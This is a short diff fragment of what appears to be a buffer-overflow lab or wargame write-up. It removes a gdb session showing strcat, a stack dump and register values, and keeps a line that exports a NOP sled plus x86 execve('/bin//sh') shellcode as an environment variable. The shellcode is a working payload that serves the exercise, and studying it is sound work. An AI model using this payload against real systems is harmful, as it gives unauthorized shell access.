@@ -74,19 +74,6 @@ pp
 ```
 
 ```
-   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
-=> 0x0804859d <+127>:	add    $0x50,%esp
-
-0xbffff6d0:	0xb7fd13e4	0x41410016	0x42204141	0x00424242
-                          AA          AA B      BBB
-                          
-(gdb) i r
-eax            0xbffff6d6	= "AAAA BBBB"
-ecx            0x42424242	
-edx            0x4	4                          
-```
-
-```
 export shellcode=$(python -c 'print "\x90"*400 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
 
